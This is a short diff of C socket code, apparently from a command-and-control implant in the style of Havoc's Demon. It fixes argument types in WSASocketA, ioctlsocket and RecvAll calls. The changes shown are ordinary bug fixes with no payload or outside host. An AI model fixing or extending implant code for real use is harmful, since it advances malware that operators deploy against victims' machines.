@@ -75,7 +75,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
 
         if ( UseIpv4 )
         {
-            WinSock = Instance->Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL );
+            WinSock = Instance->Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );  // Last arg is DWORD flags
             if ( WinSock == INVALID_SOCKET )
             {
                 PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
@@ -314,13 +314,15 @@ VOID SocketRead()
             {
                 PartialData.Length = 0;
                 PartialData.Buffer = NULL;
+                u_long ReadSize    = 0;  // Temp var for ioctlsocket (expects u_long*)
+                DWORD  RecvLen     = 0;  // Temp var for RecvAll (expects PDWORD)
 
                 /*
                  * FIONREAD returns the amount of data that can be read in a single call to the recv function
                  * this might not be the same as the total amount of data queued on the socket.
                  * because of this, we read for new data in a loop
                  */
-                if ( Instance->Win32.ioctlsocket( Socket->Socket, FIONREAD, &PartialData.Length ) == SOCKET_ERROR )
+                if ( Instance->Win32.ioctlsocket( Socket->Socket, FIONREAD, &ReadSize ) == SOCKET_ERROR )
                 {
                     PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
 
@@ -330,15 +332,18 @@ VOID SocketRead()
                     Failed    = TRUE;
                     ErrorCode = Instance->Win32.WSAGetLastError();
                 }
+                PartialData.Length = (UINT32)ReadSize;
 
                 if ( PartialData.Length > 0 )
                 {
                     PartialData.Buffer = MmHeapAlloc( PartialData.Length );
+                    RecvLen = PartialData.Length;
 
-                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
+                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &RecvLen ) ) {
                         Failed    = TRUE;
                         ErrorCode = Instance->Win32.WSAGetLastError();
                     }
+                    PartialData.Length = (UINT32)RecvLen;
 
                     if ( PartialData.Length > 0 )
                     {
